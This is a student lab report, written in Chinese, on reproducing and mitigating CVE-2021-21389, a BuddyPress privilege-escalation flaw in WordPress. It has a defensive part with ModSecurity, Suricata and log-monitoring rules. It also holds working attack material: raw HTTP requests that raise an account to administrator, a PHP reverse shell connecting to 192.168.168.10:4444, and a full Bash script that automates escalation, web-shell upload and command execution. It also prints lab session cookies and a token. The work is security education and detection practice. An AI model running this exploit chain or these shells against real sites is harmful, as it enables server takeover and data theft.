
# 个人实践心得体会

## 一、主要贡献

在本次实验中，我完成了以下工作：

1. **漏洞复现与利用**
   - 成功搭建了包含 WordPress 和 BuddyPress 插件的测试环境。
   - 完整复现了 CVE-2021-21389 垂直越权漏洞，从注册绕过、激活账户到最终提权为管理员。
   - 编写并执行了自动化攻击脚本（Bash），实现了从注册、登录、创建用户组、提权到远程代码执行（RCE）的全流程自动化。

2. **防御机制构建**
   - 搭建并配置了 ModSecurity WAF，结合 OWASP 核心规则集（CRS）和自定义规则，成功拦截 CVE-2021-21389 攻击行为。
   - 实现了 Apache 反向代理 + ModSecurity 的架构，确保所有请求都经过 WAF 检测后再转发至目标服务器。
   - 配置 iptables 规则，将外部流量重定向至 WAF 端口（81），实现透明拦截。

3. **检测与日志分析**
   - 使用多种方法对攻击行为进行检测：
     - 手动使用 Wireshark 抓包分析 HTTP 请求。
     - 编写 Python 脚本实时监控 Apache 日志文件 `/var/log/apache2/access.log`，识别注册、激活、后台访问等可疑行为。
     - 使用 GoAccess 工具对日志进行可视化分析，识别高频访问 IP、异常 URI 请求。
     - 配置 Suricata IDS，编写自定义规则检测 CVE-2021-21389 提权尝试，并成功捕获攻击流量。

4. **问题排查与优化**
   - 在实验过程中多次遇到网络配置问题（如 iptables 未生效、Apache 未监听正确端口），通过 `iptables-save`、`systemctl restart apache2`、`docker inspect` 等命令定位并解决。
   - 解决了 WAF 拦截误报问题，通过调整 ModSecurity 自定义规则，提高了检测精度。

---

## 二、印象深刻的技术难点与解决方案

### 1. **WAF 配置失败导致攻击流量未被拦截**

#### 🧨 问题现象：
发送恶意请求时，直接访问目标服务器的 `23509` 端口可以成功提权，但通过 WAF 的 `81` 端口却返回 `403 Forbidden`。这说明 WAF 起作用了，但无法通过 `curl http://<ip>:23509` 测试原始漏洞。

#### 🔍 问题分析：
- 目标服务器（WordPress）绑定的是 `0.0.0.0:23509`，意味着它可以接受来自任何 IP 的连接。
- 因此，攻击者可以直接绕过 WAF，直接访问目标服务器的 `23509` 端口，从而规避 WAF 检测。

#### ✅ 解决方案：
- 修改 Docker 启动参数，使目标服务器仅绑定 `127.0.0.1:23509`，即只允许本地访问。
- 添加 iptables 规则，将外部访问 `23509` 的流量重定向至 `81` 端口，强制其经过 WAF。
- 最终拓扑结构如下：

```bash
+-------------------+       +-------------------+       +-------------------+
|      Client       | ----> |     WAF (Apache   | ----> |   Target Server   |
|    (curl 请求)    |       |   + ModSecurity)  |       | (Wordpress 测试环境) |
+-------------------+       +-------------------+       +-------------------+
        |                           |                           |
        | 1. 发送请求到 81           | 2. 重定向到 23509          | 3. 处理请求
        | ------------------------> | ------------------------> |
        |                           |                           |
        |                           | 4. 拦截恶意请求            |
        |                           | (返回 403 Forbidden)      |
        | <------------------------ |                           |
        |                           |                           |
        |                           | 5. 记录日志                |
        |                           | (modsec_audit.log)        |
```

---

### 2. **ModSecurity 规则匹配失败导致误拦截或漏拦截**

#### 🧨 问题现象：
- 自定义规则未能正确匹配攻击请求，导致部分提权请求未被拦截。
- 或者某些合法请求被错误拦截，影响正常功能。

#### 🔍 问题分析：
- ModSecurity 规则的正则表达式不够精确，例如：
  ```apache
  SecRule REQUEST_URI "@contains /wp-json/buddypress/v1/members/me"
  ```
  这个规则可能匹配到其他相似路径，比如 `/wp-json/buddypress/v1/members/me/123`，从而导致误拦截。
- 规则的 `phase` 设置不正确，有些规则应该在 phase 2（请求体解析后）执行，否则无法获取完整的 JSON 数据。

#### ✅ 解决方案：
- 使用更严格的正则匹配：
  ```apache
  SecRule REQUEST_URI "@rx ^/wp-json/buddypress/v1/members/me$" \
     "id:1001,phase:2,block,msg:'CVE-2021-21389 提权尝试'"
  ```
- 明确指定 `phase:2`，确保规则在请求体处理完成后执行。
- 对请求体内容进行解码和规范化处理，避免因编码问题导致匹配失败：
  ```apache
  t:none,t:urlDecode,t:htmlEntityDecode
  ```

---

### 3. **Suricata 规则编写与调试**

#### 🧨 问题现象：
- Suricata 初始规则未能准确匹配 CVE-2021-21389 攻击特征。
- 规则触发频率过高，导致误报严重。

#### 🔍 问题分析：
- Suricata 规则中对 HTTP 请求体的匹配不够具体，容易受到其他 POST 请求干扰。
- 未设置合理的 `classtype` 和 `sid`，导致日志难以区分真实攻击与误报。

#### ✅ 解决方案：
- 精细化规则匹配条件，增加 `http_client_body` 字段的匹配逻辑：
  ```suricata
  alert http $EXTERNAL_NET any -> $HOME_NET any (
     msg:"CVE-2021-21389: BuddyPress 提权尝试";
     flow:to_server,established;
     content:"POST"; http_method;
     content:"/wp-json/buddypress/v1/members/me"; http_uri;
     content:"roles"; http_client_body; fast_pattern;
     content:"administrator"; http_client_body;
     sid:1000001;
     rev:1;
     classtype:web-application-attack;
  )
  ```
- 限制规则适用范围，仅针对特定的 HTTP 方法和 URI 路径。
- 设置合适的分类类型（`classtype`）和唯一 ID（`sid`），便于日志归类和管理。

---

### 三、总结

通过本次实验，我深入理解了 Web 应用安全的核心原理，包括漏洞利用、防御机制构建以及入侵检测系统的应用。我在以下几个方面取得了显著提升：

- **攻击链理解**：掌握了从注册绕过、权限提升到 RCE 的完整攻击流程。
- **防御能力增强**：成功部署并优化了 ModSecurity WAF，能够有效防御 CVE-2021-21389 攻击。
- **日志分析与检测能力**：熟悉了多种日志分析工具（Wireshark、GoAccess、Suricata）的使用，并能编写规则检测特定攻击行为。
- **网络配置与调试能力**：解决了多个与 iptables、Apache、Docker 相关的网络问题，提升了系统级调试能力。

此次实验不仅加深了我对 Web 安全的理解，也锻炼了我在实际环境中发现问题、分析问题和解决问题的能力。

---
---

# 实验报告：WordPress 垂直越权（CVE-2021-21389）漏洞复现/漏洞利用/漏洞缓解

---

## 一、实验目的
本文旨在详细复现 WordPress 垂直越权漏洞（CVE-2021-21389），通过实验过程深入理解该漏洞的成因、利用方法及其潜在风险，为后续的安全防护提供参考。

---

## 二、实验环境
1. **操作系统**：Kali Linux
2. **WordPress**：版本 5.0.4（受影响版本）
3. **BuddyPress 插件**：版本 7.2.0（受影响版本）
4. **测试工具**：Burp Suite 等抓包工具

---

## 三、漏洞简介
BuddyPress 是一个用于构建社区站点的开源 WordPress 插件。在 7.2.1 之前的 5.0.4 版本的 BuddyPress 中，非特权普通用户可以通过利用 REST API 成员端点中的问题来获得管理员权限。该漏洞已在 BuddyPress 7.2.1 中修复。插件的现有安装应更新到此版本以缓解问题。

---

## 四、实验步骤

### （一）环境搭建
1. **拉取所需镜像**
   ```bash
   docker pull vulfocus/wordpress_cve-2021-21389:latest
   docker pull vulfocus/thinkphp-cve_2018_1002015:latest
   docker pull vulfocus/samba-cve_2017_7494:latest 
   docker pull c4pr1c3/vulshare_nginx-php-flag:latest
   docker pull vulfocus/apache-cve_2021_41773
   docker pull vulfocus/weblogic-cve_2019_2555
   ```
   ![1748228876010](image/readme/1748228876010.png)
   ![1748228896276](image/readme/1748228896276.png)
   ![1748228922320](image/readme/1748228922320.png)
   ![1748228954364](image/readme/1748228954364.png)

2. **启动vulfucus环境**
![1747896129453](image/readme/1747896129453.png)
![1747896152092](image/readme/1747896152092.png)

3. **场景搭建&启动场景**
![1748189565806](image/readme/1748189565806.png)

4. **打开浏览器，访问场景地址**
![1747897882478](image/readme/1747897882478.png)

### （二）注册绕过
1. **抓包注册请求**
   - 使用 Burp Suite 抓包。
   ![1747897930858](image/readme/1747897930858.png)
   - 点击`send to repeater`，构造 POST 请求，发送到 `/wp-json/buddypress/v1/signup`。
   - 请求体如下：
     ```json
     {
       "user_login": "attacker1",
       "user_email": "attacker1@163.com",
       "user_name": "attacker1",
       "password": "attacker1"
     }
     ```
    - 最终构造的请求包：
        ```http
        POST /wp-json/buddypress/v1/signup HTTP/1.1
        Host: 192.168.20.12:10459
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0
        Accept: */*
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
        Content-Type: application/json; charset=UTF-8
        Content-Length: 112

        {"user_login": "attcker1", "user_email": "attacker1@163.com", "user_name": "attacker1", "password": "attacker1"}
        ```

    - 替换 `Host` 为自己的 IP 和端口。
    - 得到回显:
        ```http
         HTTP/1.1 200 OK
         Date: Thu, 22 May 2025 03:48:36 GMT
         Server: Apache/2.4.18 (Ubuntu)
         X-Robots-Tag: noindex
         Link: <http://192.168.20.12:10459/wp-json/>; rel="https://api.w.org/"
         X-Content-Type-Options: nosniff
         Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link
         Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
         Allow: POST
         Content-Length: 280
         Content-Type: application/json; charset=UTF-8
         [{"id":3,"user_login":"attcker1","registered":"2025-05-22T03:48:36","user_name":"attacker1","activation_key":"aoM0svmO72kVVPbNxYadAKifjIUuYqj8","user_email":"attacker1@163.com","date_sent":"2025-05-22T03:48:36","count_sent":1,"meta":{"field_1":"attacker1","profile_field_ids":1}}]
         ```
2. **提取激活密钥**
   - 发送请求后，服务器会返回一个响应包，其中包含 `activation_key`。
   ![1748229130073](image/readme/1748229130073.png)
   `activation_key` : `aoM0svmO72kVVPbNxYadAKifjIUuYqj8`
   - 提取 `activation_key`，用于后续的激活操作。

3. **构造激活请求**
   - 使用提取的 `activation_key` 构造 PUT 请求，发送到 `/wp-json/buddypress/v1/signup/activate/<activation_key>`。
   ![1748229140618](image/readme/1748229140618.png)
   - 请求体与注册请求相同。
   - 完整请求包：
        ```http
        PUT /wp-json/buddypress/v1/signup/activate/aoM0svmO72kVVPbNxYadAKifjIUuYqj8 HTTP/1.1
        Host:192.168.20.12:10459
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0
        Accept: */*
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
        Content-Type: application/json; charset=UTF-8
        Content-Length: 112
        {"user_login": "attcker1", "user_email": "attacker1@163.com", "user_name": "attacker1", "password": "attacker1"}
        ```
    - **得到回显:**
        ```http
        HTTP/1.1 200 OK
        Date: Thu, 22 May 2025 03:49:29 GMT
        Server: Apache/2.4.18 (Ubuntu)
        X-Robots-Tag: noindex
        Link: <http://192.168.20.12:10459/wp-json/>; rel="https://api.w.org/"
        X-Content-Type-Options: nosniff
        Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link
        Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
        Content-Length: 280
        Content-Type: application/json; charset=UTF-8
        [{"id":3,"user_login":"attcker1","registered":"2025-05-22T03:48:36","user_name":"attacker1","activation_key":"aoM0svmO72kVVPbNxYadAKifjIUuYqj8","user_email":"attacker1@163.com","date_sent":"2025-05-22T03:48:36","count_sent":1,"meta":{"field_1":"attacker1","profile_field_ids":1}}]
        ```

4. **登录验证**
   - 使用注册的账号 `attacker1` 和密码 `attacker1` 登录。
   
   ![1748229151058](image/readme/1748229151058.png)
   - 登录后，用户将获得普通用户权限，但尚未获得管理员权限。
   ![1748229159901](image/readme/1748229159901.png)
   ![1748069641307](image/readme/1748069641307.png)

### （三）获取管理员权限
1. **创建用户组**
   - 访问 `http://<your_ip>:<your_port>/groups/create/step/group-details/`。
   - 填写组信息并完成创建。
   - 通过创建用户组，用户将被添加到该组中，为后续的权限提升做准备。
    ![1748229172877](image/readme/1748229172877.png)
    ![1748229180474](image/readme/1748229180474.png)
    ![1748229188133](image/readme/1748229188133.png)
    ![1748229195716](image/readme/1748229195716.png)
    ![1748229203384](image/readme/1748229203384.png)
    ![1748229210722](image/readme/1748229210722.png)
2. **抓取关键参数**
   - 点击 `manage`，再点击 `members`，使用抓包工具抓取请求。
   - 提取请求中的 `X-WP-Nonce` 和 `Cookie` 参数。
   ![1748229219600](image/readme/1748229219600.png)
    **cookie:**
        ```http
        grafana_session=7cee305b146bf89decccac3eb414687f; grafana_session_expiry=1747723015; zbx_sessionid=060b0abb1800d98452c40e735dbb58fa; wp-settings-time-2=1747822280; experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqZzRZVGcyWlRWakxUa3dZamN0TkRNMFl5MDVaREF4TFdZME5EZ3haVFptTVdNd01TST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--a69a8d8efbbef8037dbb261a0526aae27fb6c1b8; metabase.DEVICE=0af33864-c7aa-43fd-89aa-287250f4c715; vue_admin_template_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzQ3OTY5MjYzLCJlbWFpbCI6IiJ9.C9VdlIBrcP4xj1g5TzsBWQosumWuAVXLH1S6Lgzk8nI; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_8232bb51e9fa6ae4bed9f94b4ce661c2=attcker1%7C1748062618%7CGvjHpcyFfFhCylwuqLNafXmiHwJqmZ5VldxGcUkR0Bz%7Ca6226440d0bde4fe9d4cf14cce8fcf49dd365c9f342c5296f67044f265433248; wp-settings-time-3=1747889821
        ```
        **X-WP-Nonce:** ``cb16f80772``

3. **构造提权请求**
   - 使用提取的 `X-WP-Nonce` 和 `Cookie` 构造 POST 请求，发送到 `/wp-json/buddypress/v1/members/me`。
   - 请求体如下：
     ```json
     {"roles": "administrator"}
     ```
   - 完整请求包：
        ```http
        POST /wp-json/buddypress/v1/members/me HTTP/1.1
        Host:192.168.20.12:10459
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0
        Accept: */*
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
        X-WP-Nonce: cb16f80772
        Cookie: grafana_session=7cee305b146bf89decccac3eb414687f; grafana_session_expiry=1747723015; zbx_sessionid=060b0abb1800d98452c40e735dbb58fa; wp-settings-time-2=1747822280; experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqZzRZVGcyWlRWakxUa3dZamN0TkRNMFl5MDVaREF4TFdZME5EZ3haVFptTVdNd01TST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--a69a8d8efbbef8037dbb261a0526aae27fb6c1b8; metabase.DEVICE=0af33864-c7aa-43fd-89aa-287250f4c715; vue_admin_template_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzQ3OTY5MjYzLCJlbWFpbCI6IiJ9.C9VdlIBrcP4xj1g5TzsBWQosumWuAVXLH1S6Lgzk8nI; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_8232bb51e9fa6ae4bed9f94b4ce661c2=attcker1%7C1748062618%7CGvjHpcyFfFhCylwuqLNafXmiHwJqmZ5VldxGcUkR0Bz%7Ca6226440d0bde4fe9d4cf14cce8fcf49dd365c9f342c5296f67044f265433248; wp-settings-time-3=1747889821SS
        Content-Type: application/json; charset=UTF-8
        Content-Length: 28
        {"roles": "administrator"}
        ```
     ![1748229231842](image/readme/1748229231842.png)
     ![1748229248038](image/readme/1748229248038.png)

4. **验证提权结果**
   - 发送请求后，用户角色将被提升为管理员。
   - 再次登录 WordPress 后台，验证是否获得管理员权限，发现 dashboard 页面功能增加。
   ![1748229256997](image/readme/1748229256997.png)

### （四）上传木马，获取 Shell
1. **上传木马文件**
   - 在 WordPress 后台，点击 `Plugins` 模块，选择 `Add New`。
   ![1748229275135](image/readme/1748229275135.png)
   ![1748229282868](image/readme/1748229282868.png)
   - 点击 `Upload Plugin`，上传包含一句话木马的 PHP 文件。
   ![1748229289429](image/readme/1748229289429.png)
   - 木马文件内容如下：
        ```php
        <?php
        $sock = fsockopen("192.168.168.10", 4444);
        $proc = proc_open("bash -i", array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
        ?>
        ```
        ![1748229299490](image/readme/1748229299490.png)
2. **验证木马执行**
   - 上传成功后，访问 `/wp-content/uploads/<year>/<month>/c.php`。
    ![1748229308986](image/readme/1748229308986.png)
    ![1748229316228](image/readme/1748229316228.png)
   **第一种方法 :**
      - 通过 URL 参数 `cmd` 执行系统命令，例如：
         ```
         http://<your_ip>:<your_port>/wp-content/uploads/2025/05/c.php?cmd=id
         ```
      - 如果返回用户 ID 信息，则说明木马执行成功，获得了 Shell。
      ![1748229325617](image/readme/1748229325617.png)
      ![1748229335224](image/readme/1748229335224.png)
      - 由此,我们找到/tmp目录下的flag,将其输入到场景flag中,成功得分
      flag为`flag-{bmh9a8fd407-0aac-4b54-995d-4bb306a739f5}`
      ![1748229344291](image/readme/1748229344291.png)
   **第二种方法 :**
      - 我们也可以用 metasploit 获取反弹 shell
      ![1748229352321](image/readme/1748229352321.png)
      ![1748229366103](image/readme/1748229366103.png)

### (五) 自动化执行攻击
1. **利用脚本**
```bash
#!/bin/bash

# 生成随机字符的函数
random_char() {
    local length=$1
    cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w "$length" | head -n 1
}

# 注册函数
register() {
    local url=$1
    local username=$2
    local password=$3

    local email="$(random_char 7)@test.com"
    local data="{\"user_login\":\"$username\",\"user_email\":\"$email\",\"user_name\":\"$username\",\"password\":\"$password\"}"

    response=$(curl -s -X POST "$url/wp-json/buddypress/v1/signup" \
        -H "Content-Type: application/json; charset=UTF-8" \
        -d "$data" \
        -w "%{http_code}")

    status_code=${response: -3}
    response_body=${response::-3}

    if [ "$status_code" -eq 500 ]; then
        echo "[-] 用户名已存在！"
        echo "[+] 尝试登录该用户名 ...."
        login "$url" "$username" "$password"
    elif [ "$status_code" -eq 404 ]; then
        echo "[-] 无法注册，因为注册功能已禁用！"
        exit 1
    else
        activation_key=$(echo "$response_body" | jq -r '.[0].activation_key')
        curl -s -X PUT "$url/wp-json/buddypress/v1/signup/activate/$activation_key" > /dev/null
    fi
}

# 登录函数
login() {
    local url=$1
    local username=$2
    local password=$3

    cookies_file=$(mktemp)

    response=$(curl -s -c "$cookies_file" -X POST "$url/wp-login.php" \
        -d "log=$username" \
        -d "pwd=$password" \
        -w "%{http_code}" \
        -o /dev/null)

    if [ "$response" -ne 302 ]; then
        echo "[-] 登录失败！"
        rm "$cookies_file"
        exit 1
    fi

    echo "$cookies_file"
}

# 创建新群组函数
createNewgroup() {
    local url=$1
    local cookies_file=$2
    local username=$3

    echo "[+] 创建新群组以获取 X-WP-Nonce"

    response=$(curl -s -b "$cookies_file" "$url/groups/create/step/group-details/")

    if [[ "$response" == *"404 Not Found"* ]]; then
        echo "[-] 站点需要启用用户群组组件！"
        exit 1
    fi

    _wp_nonce=$(echo "$response" | grep -oP 'name="_wpnonce" value="\K[^"]+')

    group_name="cve-2021-21389$username"

    curl -s -b "$cookies_file" -X POST "$url/groups/create/step/group-details/" \
        -F "group-name=$group_name" \
        -F "group-desc=$group_name" \
        -F "_wpnonce=$_wp_nonce" \
        -F "group-id=0" \
        -F "save=Create Group and Continue" > /dev/null

    response=$(curl -s -b "$cookies_file" "$url/groups/$group_name/admin/manage-members/")
    x_wp_nonce=$(echo "$response" | grep -oP 'var wpApiSettings = .*?"nonce":"\K[^"]+')

    echo "$x_wp_nonce"
}

# 提权函数
privilegeEscalation() {
    local url=$1
    local cookies_file=$2
    local x_wp_nonce=$3

    echo "[+] 提权为管理员！"

    data='{"roles":"administrator"}'

    curl -s -b "$cookies_file" -X POST "$url/wp-json/buddypress/v1/members/me" \
        -H "X-WP-Nonce: $x_wp_nonce" \
        -H "Content-Type: application/json; charset=UTF-8" \
        -d "$data" > /dev/null
}

# 远程代码执行函数
rce() {
    local url=$1
    local cookies_file=$2
    local command=$3

    echo "[+] 检查 RCE ..."

    response=$(curl -s -b "$cookies_file" "$url/wp-admin/plugin-install.php")

    if [[ "$response" == *"403 Forbidden"* ]]; then
        echo "[-] 你不是管理员！"
        exit 1
    fi

    _wp_nonce=$(echo "$response" | grep -oP 'name="_wpnonce" value="\K[^"]+')

    filename="cve202121389.php"
    php_payload="<?php system(\$_GET['cmd']); ?>"

    # 创建临时文件存储 payload
    payload_file=$(mktemp)
    echo "$php_payload" > "$payload_file"

    # 创建临时文件存储响应
    response_file=$(mktemp)

    curl -s -b "$cookies_file" -X POST "$url/wp-admin/update.php?action=upload-plugin" \
        -F "_wpnonce=$_wp_nonce" \
        -F "pluginzip=@$payload_file;filename=$filename" \
        -F "install-plugin-submit=Install Now" \
        -o "$response_file"

    rm "$payload_file"

    year=$(date +%Y)
    month=$(date +%m)

    echo "[+] 通过 $command 命令执行 RCE："
    link_shell="$url/wp-content/uploads/$year/$month/$filename?cmd=$command"
    response=$(curl -s -b "$cookies_file" "$link_shell")
    echo "$response"
    echo "[+] RCE 链接："
    echo "$link_shell"
    echo "[+] 完成！"

    rm "$response_file"
}

# 主函数
main() {
    if [ "$#" -ne 4 ]; then
        echo "[+] 用法: $0 <目标> <新用户名> <新密码> <命令>"
        echo "[+] 示例: $0 http://test.local test 1234 whoami"
        exit 1
    fi

    url=$1
    username=$2
    password=$3
    command=$4

    echo "[+] 尝试注册 ..."
    register "$url" "$username" "$password"

    echo "[+] 尝试登录 ..."
    cookies_file=$(login "$url" "$username" "$password")
    echo "[+] 登录成功！"

    x_wp_nonce=$(createNewgroup "$url" "$cookies_file" "$username")

    privilegeEscalation "$url" "$cookies_file" "$x_wp_nonce"

    rce "$url" "$cookies_file" "$command"

    # 清理 cookies 文件
    rm "$cookies_file"
}

main "$@"
```
![1748220636460](image/readme/1748220636460.png)

---

## 五、漏洞原理分析
1. **注册绕过**
   - BuddyPress 的注册机制存在缺陷，允许攻击者通过直接激活账户绕过邮箱验证。
   - 该机制未对激活请求进行严格的身份验证，导致攻击者可以利用 `activation_key` 直接激活账户。
2. **权限提升**
   - BuddyPress 的 REST API 成员端点 `/wp-json/buddypress/v1/members/me` 未对敏感字段（如 `roles`）进行权限校验。
   - 攻击者可以通过修改 `roles` 字段，将普通用户提升为管理员。
3. **木马上传**
   - WordPress 的插件上传功能未对上传文件的类型进行严格限制，允许上传 PHP 文件。
   - 攻击者可以利用此漏洞上传包含恶意代码的 PHP 文件，从而在服务器上执行任意命令。

---

## PART2 漏洞利用检测
### 手动检测
#### [ 方法一 ]
1. **wireshark抓包**
   我们可以利用wireshark抓包来查看攻击行为。
   ```bash
   sudo tcpdump -i eth1 -w capture.pcap port 18813
   ```
   ![1747914135600](image/readme/1747914135600.png)
   打开``wireshark``并分析 : 
   ![1747914180373](image/readme/1747914180373.png)
   **过滤http , 分析其中一个包 , 右键follow ->http stream**
   ![1748236380067](image/readme/1748236380067.png)
   ![1748236450360](image/readme/1748236450360.png)
   针对WordPress站点BuddyPress插件的API请求：

   ```
   PUT /wp-json/buddypress/v1/signup/activate/v6EeK8XWihRsxXvXAWPMVzSTO2gs7WdF HTTP/1.1
   ```

   - **方法**: PUT 
   - **端点**: `/wp-json/buddypress/v1/signup/activate/v6EeK8XWihRsxXvXAWPMVzSTO2gs7WdF`
   - BuddyPress的REST API端点
   - 尝试激活一个用户注册(v6EeK8XWihRsxXvXAWPMVzSTO2gs7WdF是激活密钥)
   - **请求体**: 
      ```json
      {
         "user_login": "attacker2",
         "user_email": "attacker2@163.com",
         "user_name": "attacker2",
         "password": "attacker2"
      }
      ```
      - 尝试创建/激活用户"attacker2"
   - **状态码**: 404 Not Found
      ```
      HTTP/1.1 404 Not Found
      ```
   - **响应体**:
      ```json
      {
         "code": "bp_rest_invalid_activation_key",
         "message": "Invalid activation key.",
         "data": {
            "status": 404
         }
      }
      ```

   1. **攻击行为**:
      - 尝试通过BuddyPress API创建/激活用户账户

   2. **回显**:
      - 服务器返回404和"Invalid activation key"
      - 表明提供的激活密钥无效或已过期

---

### 自动化检测
#### [ 方法一 ]
1. **监听日志**
   进入wordpress容器中查看启动文件``start.sh`` , 我们可以看到 `/etc/init.d/mysql restart` 和 `/etc/init.d/apache2 restart` 这两个命令，这说明容器的日志很有可能写入了 `/var/log/apache2/access.log` 文件，所以我们可以实时监听这个文件，并查看注册或权限提升的尝试行为。
   ```bash
   root@3efe65610f5a:/# 
   cat start.sh
   #!/bin/bash
   /etc/init.d/mysql restart
   /etc/init.d/apache2 restart

   /usr/bin/tail -f /dev/null
   ```

   我们的监听python代码如下：
   ```python
   import time
   import re

   def monitor_access_log(log_path):
      print("[*] 正在实时监控日志文件: {}".format(log_path))

      try:
         with open(log_path, 'r') as f:
               f.seek(0, 2)  # 移动到文件末尾，监听新增内容

               while True:
                  line = f.readline()
                  if not line:
                     time.sleep(0.5)
                     continue

                  # 示例攻击行为规则：你可以继续加规则
                  if re.search(r'PUT\s+/wp-json/buddypress/v1/signup/activate/', line):
                     print("[!!!] 权限提升尝试检测到: {}".format(line.strip()))

                  elif re.search(r'POST\s+/wp-json/buddypress/v1/signup', line):
                     print("[!!!] 注册攻击行为检测到: {}".format(line.strip()))

                  elif re.search(r'/wp-admin', line) and 'wp-login.php' not in line:
                     print("[*] 后台访问行为检测到: {}".format(line.strip()))

      except Exception as e:
         print("[!] 错误: {}".format(e))

   if __name__ == "__main__":
      monitor_access_log("/var/log/apache2/access.log")
   ```
   - 当攻击者注册时
   ![1747911181136](image/readme/1747911181136.png)
   - 当攻击者激活时
   ![1747911640431](image/readme/1747911640431.png)
   可以发现均监听到了相应的攻击行为。

---

#### [ 方法二 ]
2. **goaccess 日志分析工具**
GoAccess 是一个开源的实时日志分析工具，专门用于分析 Web 服务器日志文件。它能够快速解析 Apache、Nginx 等常见 Web 服务器生成的日志，并提供直观的可视化统计信息，帮助安全人员和运维人员快速发现异常行为或潜在攻击。
- 为了使用 GoAccess 进行日志分析，首先需要安装它：
   ```bash
   root@3efe65610f5a:/# 
   apt update && apt install goaccess
   ```
   ![1747912555913](image/readme/1747912555913.png)
- 接下来我们使用 GoAccess 对 `/var/log/apache2/access.log` 文件进行分析：
   ```bash
   root@3efe65610f5a:/# 
   goaccess -f /var/log/apache2/access.log \
   -c \
   --log-format='%h %^[%d:%t %^] "%r" %s %b "%R" "%u"' \
   --date-format=%d/%b/%Y \
   --time-format=%H:%M:%S
   ```
   | 参数 | 说明 |
   |------|------|
   | `-f /var/log/apache2/access.log` | 指定要分析的日志文件路径。`access.log` 是 Apache 默认记录访问请求的日志文件。 |
   | `-c` | 进入交互式配置界面，用户可以在其中选择需要启用的模块（如 IP 地理位置查询、是否显示图表等）。 |
   | `--log-format=...` | 自定义日志格式，必须与 `access.log` 的实际格式匹配，否则无法正确解析。 |
   | `--date-format=%d/%b/%Y` | 设置日期格式为日/月/年（例如：10/Apr/2025） |
   | `--time-format=%H:%M:%S` | 设置时间格式为小时:分钟:秒 |


- GoAccess 需要通过 `--log-format` 告知其如何解析日志内容。以下是一个典型的 Apache `access.log` 条目示例：

   ```
   192.168.1.100 - - [10/Apr/2025:14:23:17 +0000] "GET /index.php HTTP/1.1" 200 3456 "-" "Mozilla/5.0"
   ```

   对应的 `--log-format` 解释如下：

   ```
   %h %^[%d:%t %^] "%r" %s %b "%R" "%u"
   ```

   | 格式符号 | 含义 |
   |----------|------|
   | `%h` | 客户端 IP 地址（host） |
   | `%^[` | 忽略左方括号 `[` |
   | `%d` | 日期（day/month/year） |
   | `%t` | 时间（hour:minute:second） |
   | `%r` | 请求行（method + path + protocol） |
   | `%s` | 响应状态码（如 200, 404） |
   | `%b` | 响应体大小（bytes） |
   | `%R` | Referer 头（即请求来源页面） |
   | `%u` | User-Agent（客户端浏览器信息） |

   > ⚠️ 注意：如果你的日志格式不同，比如包含额外字段（如请求耗时、cookie 等），你需要相应地修改 `--log-format` 字符串，否则会导致解析失败。


   执行上述命令后，GoAccess 会进入终端界面并展示以下关键指标：

   1. **总体请求统计**
      - 总请求数、有效请求数、无效请求（如格式错误）数。
      - 成功响应（2xx）、重定向（3xx）、客户端错误（4xx）、服务端错误（5xx）占比。

   2. **访客 IP 统计**
      - 显示每个 IP 的请求次数，可用于识别异常高频访问者（如爬虫或攻击者）。

   3. **请求 URL 排名**
      - 展示最常访问的 URL，有助于识别热门资源或潜在攻击入口（如 `/wp-json/buddypress/v1/signup`）。

   4. **HTTP 状态码分布**
      - 识别大量 404 或 403 请求，可能表示扫描行为或尝试漏洞利用。

   5. **User-Agent 分布**
      - 查看访问者的浏览器类型，识别非正常访问（如脚本或自动化工具发起的请求）。

   6. **时间趋势图**
      - 展示每小时/每天的访问量变化，帮助识别突发流量或 DDoS 攻击。



   在本次实验中，GoAccess 可以用来监控 WordPress 漏洞攻击行为，例如：

   - ✅ **检测注册绕过攻击**：通过查看 `/wp-json/buddypress/v1/signup` 接口的访问频率。
   - ✅ **识别提权尝试**：检查是否有大量对 `/wp-json/buddypress/v1/members/me` 的 POST 请求。
   - ✅ **追踪恶意上传行为**：查找 `/wp-admin/media-new.php` 或 `/wp-content/uploads/` 相关请求。
   ![1747912486912](image/readme/1747912486912.png)

---

#### [ 方法三 ]

3. **suricata检测**
